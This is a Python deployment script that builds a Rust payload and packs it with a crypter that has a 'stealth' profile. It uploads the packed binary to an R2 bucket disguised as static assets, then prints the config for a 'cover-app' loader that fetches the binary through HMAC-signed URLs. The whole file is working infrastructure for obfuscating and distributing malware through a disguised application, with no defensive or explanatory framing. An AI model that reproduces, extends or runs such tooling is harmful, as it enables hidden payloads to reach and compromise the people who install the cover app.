#!/usr/bin/env python3
"""
rewire/deploy.py — glue between svc-crypter output and the cover-app
loader path.

Pipeline:
  1. cargo build svc-payload for the target
  2. svc-crypter wraps it -> out/<name>/<name>
  3. Upload wrapped ELF to R2 under `token_id` via wrangler
  4. Push SHARED_SECRET to the worker
  5. Verify: sign a URL, fetch it back, byte-compare

Usage:
    python3 rewire/deploy.py --name campaign_a --target linux
    python3 rewire/deploy.py --name linux_v1 --target linux --skip-build
    python3 rewire/deploy.py --name linux_v1 --config /path/to/cover/config.json
"""
import argparse
import hashlib
import hmac
import json
import os
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
DEFAULT_CONFIG = REPO / "config.json"


def sh(cmd, **kw):
    print(f"  $ {' '.join(str(c) for c in cmd)}")
    return subprocess.run(cmd, check=True, **kw)


def load_config(path: Path) -> dict:
    if not path.exists():
        sys.exit(f"[!] missing config: {path}")
    with open(path, encoding="utf-8") as f:
        return json.load(f)


def build_payload(cfg, target):
    triple = {
        "linux":   "x86_64-unknown-linux-gnu",
        "windows": "x86_64-pc-windows-gnu",
    }[target]
    print(f"[*] building svc-payload for {triple}")
    sh(["cargo", "build", "--release",
        "-p", "svc-payload", "--target", triple], cwd=REPO)
    ext = ".exe" if target == "windows" else ""
    return REPO / "target" / triple / "release" / f"svc-payload{ext}"


def build_crypter():
    print("[*] building svc-crypter")
    sh(["cargo", "build", "--release", "-p", "svc-crypter"], cwd=REPO)
    return REPO / "target" / "release" / "svc-crypter"


def wrap(crypter, payload, target, name, profile="balanced"):
    print(f"[*] wrapping -> out/{name}/")
    sh([str(crypter), str(payload),
        "--target", target,
        "--out", name,
        "--profile", profile], cwd=REPO)
    ext = ".exe" if target == "windows" else ""
    triple = {
        "linux":   "x86_64-unknown-linux-gnu",
        "windows": "x86_64-pc-windows-gnu",
    }[target]
    candidates = [
        REPO / "out" / name / f"{name}{ext}",
        REPO / "out" / name / "target" / triple / "release" / f"{name}{ext}",
    ]
    for c in candidates:
        if c.exists():
            return c
    sys.exit(f"[!] no wrapped binary under out/{name}/")


def upload_r2(binary: Path, bucket: str, key: str):
    print(f"[*] uploading {binary.name} -> R2 {bucket}/{key}")
    sh(["wrangler", "r2", "object", "put",
        f"{bucket}/{key}", f"--file={binary}",
        "--content-type=application/octet-stream"], cwd=REPO)


def push_secret(secret: str):
    print("[*] pushing SHARED_SECRET to worker")
    p = subprocess.run(
        ["wrangler", "secret", "put", "SHARED_SECRET"],
        input=secret, text=True, cwd=REPO,
        capture_output=True,
    )
    if p.returncode != 0:
        print(f"  !! wrangler secret put failed: {p.stderr.strip()}")
        print("     (You may need to run it manually.)")
    else:
        print("  ok")


def sign_url(endpoint: str, token_id: str, secret: str) -> str:
    ts = str(int(time.time()))
    msg = f"{token_id}:{ts}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).hexdigest()
    return f"{endpoint.rstrip('/')}/?id={token_id}&ts={ts}&sig={sig}"


def verify(endpoint, token_id, secret, expected: bytes):
    print("[*] verifying round-trip")
    url = sign_url(endpoint, token_id, secret)
    try:
        with urllib.request.urlopen(url, timeout=30) as r:
            got = r.read()
    except Exception as e:
        sys.exit(f"[!] fetch failed: {e}")
    if got == expected:
        print(f"  ok — {len(got)} bytes match")
        return True
    print(f"  !! size got={len(got)} expected={len(expected)}")
    hg = hashlib.sha256(got).hexdigest()[:16]
    he = hashlib.sha256(expected).hexdigest()[:16]
    print(f"     sha256 got={hg} expected={he}")
    return got == expected


def print_cover_snippet(endpoint, token_id, secret):
    print()
    print("[*] cover-app config snippet — set this in its config.json:")
    print("    \"system\": {")
    print(f"      \"endpoint\":      \"{endpoint}\",")
    print(f"      \"token_id\":      \"{token_id}\",")
    print(f"      \"shared_secret\": \"{secret}\"")
    print("    }")
    print()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--name", required=True, help="build name / R2 key")
    ap.add_argument("--target", default="linux", choices=["linux", "windows"])
    ap.add_argument("--profile", default="balanced",
                    choices=["stealth", "fast", "compatible", "balanced"])
    ap.add_argument("--bucket", default=None, help="override R2 bucket")
    ap.add_argument("--config", default=str(DEFAULT_CONFIG),
                    help="path to config.json (default: repo root)")
    ap.add_argument("--skip-build", action="store_true")
    ap.add_argument("--skip-upload", action="store_true")
    ap.add_argument("--skip-verify", action="store_true")
    args = ap.parse_args()

    cfg = load_config(Path(args.config))
    system = cfg.get("system", {})
    endpoint = system.get("endpoint", "")
    token_id = args.name
    secret = system.get("shared_secret", "")
    bucket = args.bucket or "static-assets-a1b2"

    if not endpoint or not secret:
        sys.exit("[!] config needs system.endpoint and system.shared_secret")

    if not args.skip_build:
        payload = build_payload(cfg, args.target)
        crypter = build_crypter()
        wrapped = wrap(crypter, payload, args.target, args.name, args.profile)
    else:
        ext = ".exe" if args.target == "windows" else ""
        wrapped = REPO / "out" / args.name / f"{args.name}{ext}"
        if not wrapped.exists():
            sys.exit(f"[!] {wrapped} not found (and --skip-build)")

    binary_bytes = wrapped.read_bytes()
    sha = hashlib.sha256(binary_bytes).hexdigest()[:16]
    print(f"[+] wrapped: {wrapped} ({len(binary_bytes)} bytes, sha256 {sha})")

    if not args.skip_upload:
        upload_r2(wrapped, bucket, token_id)
        push_secret(secret)
    else:
        print("[*] skipping upload (--skip-upload)")

    print_cover_snippet(endpoint, token_id, secret)

    if not args.skip_upload and not args.skip_verify:
        ok = verify(endpoint, token_id, secret, binary_bytes)
        sys.exit(0 if ok else 2)


if __name__ == "__main__":
    main()
